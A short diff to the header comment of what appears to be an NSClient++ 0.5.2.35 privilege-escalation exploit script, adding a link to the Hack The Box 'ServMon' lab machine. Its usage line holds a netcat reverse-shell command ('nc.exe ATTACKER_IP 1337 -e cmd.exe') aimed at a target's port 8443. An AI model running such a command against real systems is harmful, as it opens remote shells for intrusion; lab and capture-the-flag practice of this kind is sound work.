@@ -3,6 +3,7 @@
 # Sources: 
 #   - https://www.exploit-db.com/exploits/46802 
 #   - https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/blob/master/exploit.py
+#   - vuln machine: https://www.hackthebox.com/machines/servmon
 #
 # Usage:
 #   python3 payload.py "C:\temp\nc.exe ATTACKER_IP 1337 -e cmd.exe" https://TARGET_IP:8443 PASSWORD
